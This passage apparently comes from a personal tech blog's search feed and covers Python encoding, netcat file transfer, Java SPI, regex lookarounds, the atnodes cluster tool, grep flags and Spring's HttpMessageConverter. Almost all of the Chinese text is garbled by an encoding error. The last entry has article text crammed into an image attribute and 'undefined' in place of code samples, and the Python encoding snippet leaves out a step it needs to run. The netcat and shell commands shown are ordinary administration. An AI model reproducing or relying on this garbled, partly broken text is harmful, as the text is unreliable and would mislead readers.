<li>é‡æ–°è®¾ç½®ç³»ç»Ÿæ¨¡å—çš„ç¼–ç </li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">sys.setdefaultencoding(<span class="string">'utf-8'</span>)</span><br></pre></td></tr></table></figure>
<ol start="3">
<li>ä½¿ç”¨Unicode</li>
</ol>
<p><code>s = u&#39;ä¸­æ–‡&#39;</code> </p>
<h2 id="to-be-continued"><a href="#to-be-continued" class="headerlink" title="to be continued"></a>to be continued</h2><h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><ol>
<li><a href="https://www.python.org/dev/peps/pep-0263/" rel="external nofollow noopener noreferrer" target="_blank">Defining Python Source Code Encodings</a></li>
</ol>
]]></content>
      
        <categories>
            
            <category> python </category>
            
        </categories>
        
        
        <tags>
            
            <tag> python-util </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[netcat(nc) â€”â€” ä½¿ç”¨å°ç»“]]></title>
      <url>http://qsli.github.io/2016/12/18/nc/</url>
      <content type="html"><![CDATA[<p>ncçš„å…¨ç§°æ˜¯netcatï¼Œæä¾›äº†è®¸å¤šå…³äºç½‘ç»œæ“ä½œçš„åŠŸèƒ½ï¼Œå·ç§°ç½‘ç»œå·¥å…·ä¸­çš„ç‘å£«å†›åˆ€ã€‚</p>
<p>ncä¹Ÿæœ‰windowsçš„ç§»æ¤ç‰ˆæœ¬ï¼š<a href="https://eternallybored.org/misc/netcat/" rel="external nofollow noopener noreferrer" target="_blank"></a></p>
<blockquote>
<p>  Netcat is a featured networking utility which reads and writes data across network connections, using the TCP/IP protocol.<br>It is designed to be a reliable â€œback-endâ€ tool that can be used directly or easily driven by other programs and scripts. At the same time, it is a feature-rich network debugging and exploration tool, since it can create almost any kind of connection you would need and has several interesting built-in capabilities.</p>
</blockquote>
<h2 id="å¸¸è§ç”¨é€”"><a href="#å¸¸è§ç”¨é€”" class="headerlink" title="å¸¸è§ç”¨é€”"></a>å¸¸è§ç”¨é€”</h2><h3 id="nc-ä¼ è¾“æ–‡ä»¶ï¼š"><a href="#nc-ä¼ è¾“æ–‡ä»¶ï¼š" class="headerlink" title="nc ä¼ è¾“æ–‡ä»¶ï¼š"></a>nc ä¼ è¾“æ–‡ä»¶ï¼š</h3><ul>
<li>ä¼ é€æ–‡ä»¶</li>
</ul>
<p>å‘é€ç«¯ï¼š<code>nc -l 6666 &lt; file</code><br>æ¥æ”¶ç«¯: <code>nc host 6666 | pv -L 30m &gt; wrapper</code></p>
<p>å…¶ä¸­pvæ˜¯ä¸€ä¸ªé™æµçš„å·¥å…·ã€‚</p>
<ul>
<li>å‹ç¼©ä¼ è¾“ä¸€ä¸ªæ–‡ä»¶å¤¹</li>
</ul>
<p><code>tar zcvf folder.tar.gz folder | nc -l 6666</code></p>
<h2 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h2><ol>
<li><a href="http://netcat.sourceforge.net/" rel="external nofollow noopener noreferrer" target="_blank">The GNU Netcat</a></li>
<li><a href="https://www.oschina.net/translate/linux-netcat-command" rel="external nofollow noopener noreferrer" target="_blank">Linux Netcat å‘½ä»¤â€”â€”ç½‘ç»œå·¥å…·ä¸­çš„ç‘å£«å†›åˆ€</a></li>
</ol>
]]></content>
      
        <categories>
            
            <category> shell </category>
            
        </categories>
        
        
        <tags>
            
            <tag> netcat </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Java SPI æ€»ç»“]]></title>
      <url>http://qsli.github.io/2016/12/17/spi/</url>
      <content type="html"><![CDATA[<h2 id="SPI-ABC"><a href="#SPI-ABC" class="headerlink" title="SPI ABC"></a>SPI ABC</h2><p>SPI ä»£è¡¨<code>Service Provider Interfaces</code>, æ˜¯ä¸€ç§æœåŠ¡æä¾›å‘ç°çš„æœºåˆ¶ã€‚JDKä¸­ä¸ºå…¶æä¾›äº†<code>ServiceLoader</code>ç”¨æ¥åŠ è½½æ¥å£å¯¹åº”çš„å®ç°ã€‚</p>
<h2 id="ä½¿ç”¨çº¦å®š"><a href="#ä½¿ç”¨çº¦å®š" class="headerlink" title="ä½¿ç”¨çº¦å®š"></a>ä½¿ç”¨çº¦å®š</h2><img src="/2016/12/17/spi/usage.jpg" title="ä½¿ç”¨çº¦å®š">
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">â””â”€â”€ src</span><br><span class="line">â”œâ”€â”€ com</span><br><span class="line">â”‚   â””â”€â”€ ivanzhang</span><br><span class="line">â”‚       â””â”€â”€ spi</span><br><span class="line">â”‚           â”œâ”€â”€ HelloInterface.java</span><br><span class="line">â”‚           â”œâ”€â”€ impl</span><br><span class="line">â”‚           â”‚   â”œâ”€â”€ ImageHello.java</span><br><span class="line">â”‚           â”‚   â””â”€â”€ TextHello.java</span><br><span class="line">â”‚           â””â”€â”€ SPIMain.java</span><br><span class="line">â””â”€â”€ META-INF</span><br><span class="line">    â””â”€â”€ services</span><br><span class="line">        â””â”€â”€ com.ivanzhang.spi.HelloInterface</span><br></pre></td></tr></table></figure>
<h2 id="ä½¿ç”¨ä¾‹å­"><a href="#ä½¿ç”¨ä¾‹å­" class="headerlink" title="ä½¿ç”¨ä¾‹å­"></a>ä½¿ç”¨ä¾‹å­</h2><ul>
<li>common-logging</li>
</ul>
<blockquote>
<p>common-loggingï¼Œapacheæœ€æ—©æä¾›çš„æ—¥å¿—çš„é—¨é¢æ¥å£ã€‚åªæœ‰æ¥å£ï¼Œæ²¡æœ‰å®ç°ã€‚å…·ä½“æ–¹æ¡ˆç”±å„æä¾›å•†å®ç°ï¼Œå‘ç°æ—¥å¿—æä¾›å•†æ˜¯é€šè¿‡æ‰«æ META-INF/services/org.apache.commons.logging.LogFactoryé…ç½®æ–‡ä»¶ï¼Œé€šè¿‡è¯»å–è¯¥æ–‡ä»¶çš„å†…å®¹æ‰¾åˆ°æ—¥å¿—æå·¥å•†å®ç°ç±»ã€‚åªè¦æˆ‘ä»¬çš„æ—¥å¿—å®ç°é‡ŒåŒ…å«äº†è¿™ä¸ªæ–‡ä»¶ï¼Œå¹¶åœ¨æ–‡ä»¶é‡Œåˆ¶å®š LogFactoryå·¥å‚æ¥å£çš„å®ç°ç±»å³å¯ã€‚</p>
</blockquote>
<ul>
<li>jdbc</li>
</ul>
<blockquote>
<p>jdbc4.0ä»¥å‰ï¼Œå¼€å‘è¿˜éœ€è¦åŸºäºClass.forName(â€œxxxâ€)çš„æ–¹å¼æ¥è£…è½½é©±åŠ¨ï¼Œjdbc4ä¹ŸåŸºäºspiçš„æœºåˆ¶æ¥å‘ç°é©±åŠ¨æä¾›å•†äº†ï¼Œå¯ä»¥é€šè¿‡META-INF/services/java.sql.Driveræ–‡ä»¶é‡ŒæŒ‡å®šå®ç°ç±»çš„æ–¹å¼æ¥æš´éœ²é©±åŠ¨æä¾›è€…ã€‚</p>
</blockquote>
<p><em>å…¶ä»–ç”¨é€”ï¼š</em></p>
<ul>
<li>Java Database Connectivity</li>
<li>Java Cryptography Extension</li>
<li>Java Naming and Directory Interface</li>
<li>Java API for XML Processing</li>
<li>Java Business Integration</li>
<li>Java Sound</li>
<li>Java Image I/O</li>
<li>Java File Systems</li>
</ul>
<h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><ol>
<li><p><a href="http://www.solinx.co/archives/142" rel="external nofollow noopener noreferrer" target="_blank">Javaçš„SPIæœºåˆ¶ä¸ç®€å•ç¤ºä¾‹</a></p>
</li>
<li><p><a href="https://my.oschina.net/u/1034176/blog/659445" rel="external nofollow noopener noreferrer" target="_blank">Java SPIæœºåˆ¶ç®€ä»‹ - oschina</a></p>
</li>
<li><p><a href="http://ivanzhangwb.github.io/blog/2012/06/01/java-spi/" rel="external nofollow noopener noreferrer" target="_blank">Java SPIæœºåˆ¶ç®€ä»‹ - æŠ€æœ¯å®…</a></p>
</li>
<li><p><a href="https://docs.oracle.com/javase/tutorial/sound/SPI-intro.html" rel="external nofollow noopener noreferrer" target="_blank">Introduction to the Service Provider Interfaces</a></p>
</li>
<li><p><a href="http://www.jianshu.com/p/bd36c023ddf0" rel="external nofollow noopener noreferrer" target="_blank">è°ˆjava SPIæœºåˆ¶ã€spring-mvcå¯åŠ¨åŠservlet3.0</a></p>
</li>
<li><p><a href="https://en.wikipedia.org/wiki/Service_provider_interface" rel="external nofollow noopener noreferrer" target="_blank">Service Provider Interface</a></p>
</li>
<li><p><a href="http://resources.sei.cmu.edu/asset_files/TechnicalNote/2002_004_001_13958.pdf" rel="external nofollow noopener noreferrer" target="_blank">Replaceable Components and the Service Provider Interface </a></p>
</li>
</ol>
]]></content>
      
        <categories>
            
            <category> java </category>
            
        </categories>
        
        
        <tags>
            
            <tag> spi </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[æ­£åˆ™æ€»ç»“]]></title>
      <url>http://qsli.github.io/2016/12/14/re/</url>
      <content type="html"><![CDATA[<h1 id="æµ‹è¯•"><a href="#æµ‹è¯•" class="headerlink" title="æµ‹è¯•"></a>æµ‹è¯•</h1><p>æ¨èä½¿ç”¨<code>RegexBudy</code></p>
<p><img src="https://www.regexbuddy.com/img/icon.png" alt></p>
<p>ç•Œé¢å¦‚ä¸‹:</p>
<p><img src="https://www.regexbuddy.com/screens/regexbuddy.png" alt></p>
<p>æ¨èpythonçš„ <code>VerbalExpressions</code> <a href="https://github.com/VerbalExpressions/PythonVerbalExpressions" rel="external nofollow noopener noreferrer" target="_blank">PythonVerbalExpressions </a></p>
<h1 id="ä½¿ç”¨å¿ƒå¾—"><a href="#ä½¿ç”¨å¿ƒå¾—" class="headerlink" title="ä½¿ç”¨å¿ƒå¾—"></a>ä½¿ç”¨å¿ƒå¾—</h1><h2 id="åŒ¹é…å¤šä¸ªå•è¯"><a href="#åŒ¹é…å¤šä¸ªå•è¯" class="headerlink" title="åŒ¹é…å¤šä¸ªå•è¯"></a>åŒ¹é…å¤šä¸ªå•è¯</h2><p><code>\b</code>å¯ä»¥åŒ¹é…ä¸€ä¸ªå•è¯çš„å¼€å¤´æˆ–è€…ç»“å°¾</p>
<p>åŒ¹é…å•ä¸ªå•è¯ï¼š <code>\bfoo\b</code> å¯ä»¥åŒ¹é…å•ä¸ªå•æµ‹ foo</p>
<p>åŒ¹é…å¤šä¸ªå•è¯ï¼š <code>\b(foo|bar)\b</code> å¯ä»¥åŒ¹é…foo æˆ–è€… bar</p>
<h2 id="åŒ¹é…å¼€å¤´å’Œç»“å°¾"><a href="#åŒ¹é…å¼€å¤´å’Œç»“å°¾" class="headerlink" title="åŒ¹é…å¼€å¤´å’Œç»“å°¾"></a>åŒ¹é…å¼€å¤´å’Œç»“å°¾</h2><p><code>^</code>å¯ä»¥åŒ¹é…å­—ç¬¦ä¸²çš„å¼€å¤´</p>
<p><code>$</code>å¯ä»¥åŒ¹é…å­—ç¬¦ä¸²çš„ç»“å°¾</p>
<h2 id="é›¶å®½æ–­è¨€"><a href="#é›¶å®½æ–­è¨€" class="headerlink" title="é›¶å®½æ–­è¨€"></a>é›¶å®½æ–­è¨€</h2><table>
<thead>
<tr>
<th>åˆ†ç±»</th>
<th>ä»£ç /è¯­æ³•</th>
<th>è¯´æ˜</th>
</tr>
</thead>
<tbody>
<tr>
<td>æ•è·</td>
<td>(exp)</td>
<td>åŒ¹é…exp,å¹¶æ•è·æ–‡æœ¬åˆ°è‡ªåŠ¨å‘½åçš„ç»„é‡Œ</td>
</tr>
<tr>
<td></td>
<td>(?<name>exp)</name></td>
<td>åŒ¹é…exp,å¹¶æ•è·æ–‡æœ¬åˆ°åç§°ä¸ºnameçš„ç»„é‡Œï¼Œä¹Ÿå¯ä»¥å†™æˆ(?â€™nameâ€™exp)</td>
</tr>
<tr>
<td></td>
<td>(?:exp)</td>
<td>åŒ¹é…exp,ä¸æ•è·åŒ¹é…çš„æ–‡æœ¬ï¼Œä¹Ÿä¸ç»™æ­¤åˆ†ç»„åˆ†é…ç»„å·</td>
</tr>
<tr>
<td>é›¶å®½æ–­è¨€</td>
<td>(?=exp) åŒ¹é…expå‰é¢çš„ä½ç½®</td>
</tr>
<tr>
<td></td>
<td>(?&lt;=exp)</td>
<td>åŒ¹é…expåé¢çš„ä½ç½®</td>
</tr>
<tr>
<td></td>
<td>(?!exp)</td>
<td>åŒ¹é…åé¢è·Ÿçš„ä¸æ˜¯expçš„ä½ç½®</td>
</tr>
<tr>
<td></td>
<td>(?&lt;!exp)</td>
<td>åŒ¹é…å‰é¢ä¸æ˜¯expçš„ä½ç½®</td>
</tr>
<tr>
<td>æ³¨é‡Š  (?#comment)</td>
<td>è¿™ç§ç±»å‹çš„åˆ†ç»„ä¸å¯¹æ­£åˆ™è¡¨è¾¾å¼çš„å¤„ç†äº§ç”Ÿä»»ä½•å½±å“ï¼Œç”¨äºæä¾›æ³¨é‡Šè®©äººé˜…è¯»</td>
</tr>
</tbody>
</table>
<h3 id="å…ˆè¡Œæ–­è¨€"><a href="#å…ˆè¡Œæ–­è¨€" class="headerlink" title="å…ˆè¡Œæ–­è¨€"></a>å…ˆè¡Œæ–­è¨€</h3><p>è¯­æ³•æ ¼å¼</p>
<p><code>[a-z]*(?=ing)</code></p>
<p>å¯åŒ¹é… cooking singing ä¸­çš„cook ä¸ sing</p>
<h3 id="åå‘æ–­è¨€"><a href="#åå‘æ–­è¨€" class="headerlink" title="åå‘æ–­è¨€"></a>åå‘æ–­è¨€</h3><p>è¯­æ³•æ ¼å¼</p>
<p><code>(?&lt;=abc)[a-z]*</code></p>
<p>å¯åŒ¹é… abcdefg ä¸­çš„defg</p>
<h3 id="è´Ÿå‘é›¶å®½æ–­è¨€"><a href="#è´Ÿå‘é›¶å®½æ–­è¨€" class="headerlink" title="è´Ÿå‘é›¶å®½æ–­è¨€"></a>è´Ÿå‘é›¶å®½æ–­è¨€</h3><p>è¯­æ³•æ ¼å¼</p>
<p><code>(?!exp)</code></p>
<p>æ–­è¨€æ­¤ä½ç½®çš„åé¢ä¸èƒ½åŒ¹é…è¡¨è¾¾å¼<code>exp</code></p>
<p><code>\b\w*q(?!u)\w*\b</code> åŒ¹é…qåé¢ä¸å‡ºç°uï¼ˆå¯ä»¥ä»¥qç»“å°¾ï¼‰</p>
<h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><ol>
<li><p><a href="https://www.regexbuddy.com/" rel="external nofollow noopener noreferrer" target="_blank">RegexBuddyå®˜ç½‘</a></p>
</li>
<li><p><a href="https://luke0922.gitbooks.io/learnregularexpressionin30minutes/content/" rel="external nofollow noopener noreferrer" target="_blank">æ­£åˆ™è¡¨è¾¾å¼30åˆ†é’Ÿå…¥é—¨æ•™ç¨‹</a></p>
</li>
<li><p><a href="http://www.biliyu.com/article/1321.html" rel="external nofollow noopener noreferrer" target="_blank">æ­£åˆ™è¡¨è¾¾å¼æ€æ ·åŒ¹é…å¤šä¸ªå•è¯</a></p>
</li>
</ol>
]]></content>
      
        <categories>
            
            <category> base </category>
            
        </categories>
        
        
        <tags>
            
            <tag> re </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[atnodeâ€”â€”åœ¨é›†ç¾¤ä¸Šæ‰¹é‡æ‰§è¡Œå‘½ä»¤]]></title>
      <url>http://qsli.github.io/2016/12/13/atnode/</url>
      <content type="html"><![CDATA[<h2 id="atnodes"><a href="#atnodes" class="headerlink" title="atnodes"></a>atnodes</h2><p>atnodeæ˜¯ä¸€ä¸ªç”¨perlå†™æˆçš„å·¥å…·ï¼Œå®ƒå¯ä»¥æ–¹ä¾¿çš„åœ¨é›†ç¾¤ä¸Šæ‰§è¡Œå‘½ä»¤</p>
<p><a href="http://search.cpan.org/~agent/SSH-Batch-0.029/bin/atnodes" rel="external nofollow noopener noreferrer" target="_blank">å®˜ç½‘é“¾æ¥</a></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">atnodes <span class="string">"echo alias grep=\'grep -n --color\' &gt;&gt; ~/.bashrc "</span>  xxx.xx[1-10].com  yyy.yy[1-10].com</span><br></pre></td></tr></table></figure>
<p>ä¸Šè¿°çš„å‘½ä»¤å°±ä¼šåœ¨åé¢ä¸¤ä¸ªåˆ—è¡¨çš„ä¸»æœºä¸Šéƒ½æ‰§è¡Œä¸€éäº†ã€‚</p>
<h2 id="tonodes"><a href="#tonodes" class="headerlink" title="tonodes"></a>tonodes</h2><p>ä¸atnodesç±»ä¼¼ï¼Œtonodes å¯ä»¥å°†æ–‡ä»¶ä¼ è¾“åˆ°é›†ç¾¤ä¸Šçš„æ²¡ä¸€ä¸ªæ–‡ä»¶</p>
<h2 id="å…¶ä»–"><a href="#å…¶ä»–" class="headerlink" title="å…¶ä»–"></a>å…¶ä»–</h2><p>fornodes: Expand patterns to machine host list</p>
<p>key2nodes: Push SSH public keys to remote clusters </p>
<h2 id="ä½œè€…åšå®¢"><a href="#ä½œè€…åšå®¢" class="headerlink" title="ä½œè€…åšå®¢"></a>ä½œè€…åšå®¢</h2><p><a href="http://weibo.com/u/1834459124?topnav=1&amp;wvr=6&amp;topsug=1&amp;is_all=1" rel="external nofollow noopener noreferrer" target="_blank">agentzhçš„å¾®åš</a></p>
]]></content>
      
        <categories>
            
            <category> shell </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[grep æ€»ç»“]]></title>
      <url>http://qsli.github.io/2016/12/07/grep/</url>
      <content type="html"><![CDATA[<h2 id="å¸¸è§ç”¨æ³•"><a href="#å¸¸è§ç”¨æ³•" class="headerlink" title="å¸¸è§ç”¨æ³•"></a>å¸¸è§ç”¨æ³•</h2><p>ç¤ºä¾‹æ–‡æœ¬ï¼š</p>
<blockquote>
<p>â€œNight gathers, and now my watch begins. It shall not end<br>until my death. I shall take no wife, hold no lands, father no<br>children. I shall wear no crowns and win no glory. I shall live<br>and die at my post. I am the sword in the darkness. I am the<br>watcher on the walls. I am the shield that guards the realms of<br>men. I pledge my life and honor to the Nightâ€™s Watch, for this<br>night and all the nights to come.â€</p>
</blockquote>
<h3 id="grep-39-keyword-39-filename"><a href="#grep-39-keyword-39-filename" class="headerlink" title="grep &#39;keyword&#39; filename"></a><code>grep &#39;keyword&#39; filename</code></h3><p>åœ¨ä¸€ä¸ªæ–‡ä»¶æŒ‰ç…§å…³é”®å­—æŸ¥æ‰¾</p>
<p> <code>grep &#39;now&#39; test.txt</code> è¾“å‡º</p>
<blockquote>
<p>â€œNight gathers, and now my watch begins. It shall not end</p>
</blockquote>
<h3 id="grep-n"><a href="#grep-n" class="headerlink" title="grep -n"></a><code>grep -n</code></h3><p>æ˜¾ç¤ºè¡Œå·</p>
<p> <code>grep -n &#39;now&#39; test.txt</code> è¾“å‡º</p>
<blockquote>
<p>1:â€Night gathers, and now my watch begins. It shall not end</p>
</blockquote>
<h3 id="grep-i"><a href="#grep-i" class="headerlink" title="grep -i"></a><code>grep -i</code></h3><p>å¿½ç•¥å¤§å°å†™</p>
<p> <code>grep -i &#39;watch&#39; test.txt</code> è¾“å‡º</p>
<blockquote>
<p>â€œNight gathers, and now my watch begins. It shall not end<br>watcher on the walls. I am the shield that guards the realms of<br>men. I pledge my life and honor to the Nightâ€™s Watch, for this</p>
</blockquote>
<h3 id="grep-v"><a href="#grep-v" class="headerlink" title="grep -v"></a><code>grep -v</code></h3><p>è¾“å‡ºä¸åŒ…å« <code>-v</code> åé¢å…³é”®å­—çš„è¡Œ</p>
<p><code>grep -v &#39;watch&#39; test.txt</code> è¾“å‡º</p>
<blockquote>
<p>until my death. I shall take no wife, hold no lands, father no<br>children. I shall wear no crowns and win no glory. I shall live<br>and die at my post. I am the sword in the darkness. I am the<br>men. I pledge my life and honor to the Nightâ€™s Watch, for this<br>night and all the nights to come.â€</p>
</blockquote>
<h3 id="grep-e"><a href="#grep-e" class="headerlink" title="grep -e"></a><code>grep -e</code></h3><p>æä¾›æ­£åˆ™çš„æ”¯æŒï¼Œå…³é”®å­—ä¸­å¯ä»¥åŒ…å«æ­£åˆ™è¡¨è¾¾å¼</p>
<h3 id="grep-B10"><a href="#grep-B10" class="headerlink" title="grep -B10"></a><code>grep -B10</code></h3><p>è¾“å‡ºåŒ¹é…è¡Œçš„åŒäº‹ï¼Œ ä¹Ÿè¾“å‡ºåŒ¹é…è¡Œä¹‹å‰çš„10è¡Œï¼ˆbeforeï¼‰</p>
<h3 id="grep-A10"><a href="#grep-A10" class="headerlink" title="grep -A10"></a><code>grep -A10</code></h3><p>è¾“å‡ºåŒ¹é…è¡Œçš„åŒæ—¶ï¼Œä¹Ÿè¾“å‡ºåŒ¹é…è¡Œä¹‹åçš„10è¡Œï¼ˆafterï¼‰</p>
<h3 id="grep-C10"><a href="#grep-C10" class="headerlink" title="grep -C10"></a><code>grep -C10</code></h3><p>è¾“å‡ºåŒ¹é…è¡Œçš„åŒæ—¶ï¼Œè¾“å‡ºä¹‹å‰å’Œä¹‹åçš„10è¡Œ</p>
<h3 id="grep-o"><a href="#grep-o" class="headerlink" title="grep -o"></a><code>grep -o</code></h3><p>åªè¾“å‡ºåŒ¹é…çš„å†…å®¹</p>
<p><code>grep -o &#39;watch&#39; test.txt</code></p>
<blockquote>
<p>watch<br>  watch</p>
</blockquote>
<h3 id="grep-c"><a href="#grep-c" class="headerlink" title="grep -c"></a><code>grep -c</code></h3><p>è¾“å‡ºåŒ¹é…çš„è¡Œæ•°çš„ä¸ªæ•°</p>
<p><code>grep -ci &#39;watch&#39; test.txt</code></p>
<blockquote>
<p>3</p>
</blockquote>
<h2 id="grep-P"><a href="#grep-P" class="headerlink" title="grep -P"></a><code>grep -P</code></h2><p>æ”¯æŒPerl styleçš„æ­£åˆ™è¡¨è¾¾å¼</p>
<blockquote>
<p>-P, â€“perl-regexp<br> Interpret PATTERN as a Perl regular expression.  This is highly experimental and grep -P may warn of  unimplemented<br> features.</p>
</blockquote>
<h3 id="é›¶å®½æ–­è¨€"><a href="#é›¶å®½æ–­è¨€" class="headerlink" title="é›¶å®½æ–­è¨€"></a>é›¶å®½æ–­è¨€</h3><h2 id="æ•è·ç»„"><a href="#æ•è·ç»„" class="headerlink" title="æ•è·ç»„"></a>æ•è·ç»„</h2><h3 id="grep-l"><a href="#grep-l" class="headerlink" title="grep -l"></a><code>grep -l</code></h3><p>æ˜¾ç¤ºæœ‰åŒ¹é…è¡Œçš„æ–‡ä»¶ï¼Œåªæ˜¾ç¤ºæ–‡ä»¶åç§°ï¼Œä¸æ˜¾ç¤ºå†…å®¹</p>
<p><code>grep -l &#39;watch&#39; test.txt</code></p>
<blockquote>
<p>test.txt</p>
</blockquote>
<h3 id="grep-H"><a href="#grep-H" class="headerlink" title="grep -H"></a><code>grep -H</code></h3><p>åœ¨åŒ¹é…è¡Œçš„å‰é¢åŒæ—¶è¾“å‡ºæ–‡ä»¶å</p>
<p><code>grep -H &#39;watch&#39; test.txt</code></p>
<blockquote>
<p>test.txt:â€Night gathers, and now my watch begins. It shall not end<br>test.txt:watcher on the walls. I am the shield that guards the realms of</p>
</blockquote>
<h2 id="é«˜äº®"><a href="#é«˜äº®" class="headerlink" title="é«˜äº®"></a>é«˜äº®</h2><h3 id="grep-â€“color"><a href="#grep-â€“color" class="headerlink" title="grep â€“color"></a>grep â€“color</h3><p><code>grep -H --color &#39;watch&#39; test.txt</code></p>
<img src="/2016/12/07/grep/color.jpg">
<h3 id="è®¾ç½®ç¯å¢ƒå˜é‡"><a href="#è®¾ç½®ç¯å¢ƒå˜é‡" class="headerlink" title="è®¾ç½®ç¯å¢ƒå˜é‡"></a>è®¾ç½®ç¯å¢ƒå˜é‡</h3><p>åœ¨ç”¨æˆ·ç›®å½•ä¸‹çš„<code>.bashrc</code>ä¸­è®¾ç½®ç¯å¢ƒå˜é‡ï¼Œä¹Ÿå¯ä»¥è¾¾åˆ°é«˜äº®çš„ç›®çš„</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> GREP_OPTIONS=<span class="string">'--color=auto'</span></span><br></pre></td></tr></table></figure>
<p>æ·»åŠ ä¹‹åè®°å¾—<code>source ~/.bashrc</code>, ç„¶åæ‰èƒ½ç”Ÿæ•ˆ</p>
<h2 id="egrep"><a href="#egrep" class="headerlink" title="egrep"></a>egrep</h2><blockquote>
<p>egrep å‘½ä»¤ä¸ grep å‘½ä»¤å¸¦ -E æ ‡å¿—æ˜¯ä¸€æ ·çš„ï¼Œé™¤äº†é”™è¯¯æ¶ˆæ¯å’Œä½¿ç”¨æƒ…å†µæ¶ˆæ¯ä¸åŒä»¥åŠ -s æ ‡å¿—çš„åŠŸèƒ½ä¸åŒä¹‹å¤–ã€‚</p>
</blockquote>
<h3 id="å¤šå…³é”®å­—"><a href="#å¤šå…³é”®å­—" class="headerlink" title="å¤šå…³é”®å­—"></a>å¤šå…³é”®å­—</h3><p>ä½¿ç”¨æ­£åˆ™å°±å¯ä»¥åŒæ—¶æœç´¢å¤šä¸ªå…³é”®å­—</p>
<p><code>grep -E &#39;keyword1 | keyword2&#39; filename</code></p>
<p><code>grep --color -E  &#39;am | to&#39; test.txt</code></p>
<img src="/2016/12/07/grep/egrep.jpg">
<h2 id="zgrep"><a href="#zgrep" class="headerlink" title="zgrep"></a>zgrep</h2><p>zgrep å¯ä»¥åœ¨å‹ç¼©æ–‡ä»¶ä¸­æœç´¢å†…å®¹</p>
<h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><ol>
<li><p><a href="https://www.cyberciti.biz/faq/howto-use-grep-command-in-linux-unix/" rel="external nofollow noopener noreferrer" target="_blank">HowTo: Use grep Command In Linux / UNIX â€“ Examples</a></p>
</li>
<li><p><a href="https://www.ibm.com/support/knowledgecenter/zh/ssw_aix_61/com.ibm.aix.cmds2/egrep.htm" rel="external nofollow noopener noreferrer" target="_blank">egrep å‘½ä»¤ - IBM</a></p>
</li>
</ol>
]]></content>
      
        <categories>
            
            <category> shell </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[HttpMessageConverter åŸç†å’Œæºç ]]></title>
      <url>http://qsli.github.io/2016/11/29/HttpMessageConverter/</url>
      <content type="html"><![CDATA[<h2 id="æ¶æ„"><a href="#æ¶æ„" class="headerlink" title="æ¶æ„"></a>æ¶æ„</h2><img src="/2016/11/29/HttpMessageConverter/arch.jpg">
<h2 id="HttpMessageConverteræ¥å£"><a href="#HttpMessageConverteræ¥å£" class="headerlink" title="HttpMessageConverteræ¥å£"></a>HttpMessageConverteræ¥å£</h2><img src="/2016/11/29/HttpMessageConverter/http-message-converter.jpg" title=") >`HttpMessageConverter` used to marshal objects into the HTTP request body and to unmarshal any response back into an object. æä¾›å°†Javaä¸­çš„å¯¹è±¡å’Œhttpè¯·æ±‚ã€å“åº”ç›¸äº’è½¬æ¢çš„åŠŸèƒ½ ### spring ä¸­çš„é…ç½® xmlé…ç½®ç¤ºä¾‹ï¼š undefined javaé…ç½®ç¤ºä¾‹ï¼š undefined ### æ¥å£æè¿° undefined ### spring æä¾›çš„å®ç°ç±» {% asset_img inherit.jpg">
<table>
<thead>
<tr>
<th>åç§°</th>
</tr>
</thead>
<tbody>
<tr>
<td>ByteArrayHttpMessageConverter</td>
</tr>
<tr>
<td>FormHttpMessageConverter</td>
</tr>
<tr>
<td>XmlAwareFormHttpMessageConverter</td>
</tr>
<tr>
<td>ResourceHttpMessageConverter</td>
</tr>
<tr>
<td>SourceHttpMessageConverter</td>
</tr>
<tr>
<td>StringHttpMessageConverter</td>
</tr>
<tr>
<td>SimpleXmlHttpMessageConverter</td>
</tr>
<tr>
<td>MappingJackson2HttpMessageConverter</td>
</tr>
<tr>
<td>GsonHttpMessageConverter</td>
</tr>
<tr>
<td>SyndFeedHttpMessageConverter</td>
</tr>
<tr>
<td>RssChannelHttpMessageConverter</td>
</tr>
<tr>
<td>AtomFeedHttpMessageConverter</td>
</tr>
</tbody>
</table>
<p>å…·ä½“åŠŸèƒ½è§ <a href="http://docs.spring.io/autorepo/docs/spring-android/1.0.x/reference/html/rest-template.html" rel="external nofollow noopener noreferrer" target="_blank">RestTemplate Module</a></p>
<p>æƒ³ç ”ç©¶æºç çš„å¯ä»¥ä»æœ€ç®€å•çš„ <code>StringHttpMessageConverter</code>çœ‹èµ·</p>
